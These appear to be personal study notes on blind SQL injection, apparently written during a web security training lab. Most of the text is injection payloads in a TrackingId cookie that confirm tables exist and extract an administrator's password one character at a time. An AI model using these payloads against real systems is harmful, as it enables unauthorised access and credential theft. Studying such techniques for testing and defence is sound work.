# blind sqli

> an sqli exploit might not return different errors, the success/fail might fall only to two categories -> get a "welcome" message or not

- if the html request header have this cookie:

`Cookie: TrackingId=duck`

- then the request looks like this:

`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'duck'`

- then an inject

`Cookie: TrackingId=duck' AND '1'='1`

- will look like this:

`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'duck' AND '1'='1'`

- where

`' AND '1'='1` -> always true, query returns a result

`' AND '1'='2` -> always false, query does not return result

> similar check for a password if we have the details:

- table name -> `Users`
- column for password strings -> `Password`
- column for user names -> `Username`
- `Username` that we know of -> `Administrator`

1. the following query will check if the first letter of the password is bigger then `m`, if it returns result it is

`' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`

2. now check if the first letter bigger then `t` (it will not return result)

`' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't`

3. maybe check for an exact result (it will return a result so the first letter is `s`)

`' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's`

> `SUBSTRING` function is called `SUBSTR` in other databases

## example

> cookie -> TrackingId=xyz

> test if it works:

`TrackingId=xyz' AND '1'='1` -> should return a result

`TrackingId=xyz' AND '1'='2` -> should not return a result

> check if `users` table exist

`TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a`

- `SELECT 'a' FROM users LIMIT 1` -> returns `a` if `users` table have at least one column, in case of true `a`=`a`

> similar check for `username:'administrator'`:

`TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a`

> check length of the password:

`TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a`

> check for first letter (bit different but result the same):

`TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a`

> check the second letter

`TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a`

> can use intruder and in intruder use clusterbomb for multiple selections
